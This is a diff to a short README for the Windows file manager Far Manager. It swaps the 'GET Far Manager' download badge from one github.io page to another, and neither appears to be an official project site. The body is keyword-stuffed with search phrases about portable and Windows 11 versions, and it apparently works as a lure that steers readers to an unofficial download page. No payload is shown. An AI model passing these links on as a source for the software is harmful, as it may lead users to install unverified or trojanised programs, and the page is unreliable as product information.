@@ -1,6 +1,6 @@
 # Far Manager
 
-[![GET Far Manager](https://img.shields.io/badge/GET-Far%20Manager-059669?style=plastic&labelColor=0F172A&logoColor=white)](https://maryturneri250.github.io/.github/Far-Manager)
+[![GET Far Manager](https://img.shields.io/badge/GET-Far%20Manager-059669?style=plastic&labelColor=0F172A&logoColor=white)](https://far-file-manager.github.io/Far-Manager/)
 
 Far Manager is a keyboard-driven Far File Manager for Windows. Two text panels, function keys, plugins. far manager 3 is the current line. far manager portable is the 7z next to the msi. far manager windows 11 runs in Windows Terminal or the old console.
 
